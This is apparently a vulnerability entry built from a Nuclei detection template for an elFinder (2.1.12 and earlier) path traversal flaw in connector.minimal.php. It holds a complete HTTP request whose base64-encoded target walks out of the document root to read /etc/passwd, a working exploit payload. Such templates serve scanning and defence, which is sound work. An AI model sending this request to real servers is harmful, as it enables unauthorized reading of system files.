# Vulnerability: elFinder  <=2.1.12 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`elFinder-path-traversal.yaml`)

## Description
elFinder through 2.1.12 is vulnerable to local file inclusion via Connector.minimal.php in std42. This allows unauthenticated remote attackers to read, write, and browse files outside the configured document root. This is due to improper handling of absolute file paths.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /php/connector.minimal.php?cmd=file&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk&download=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

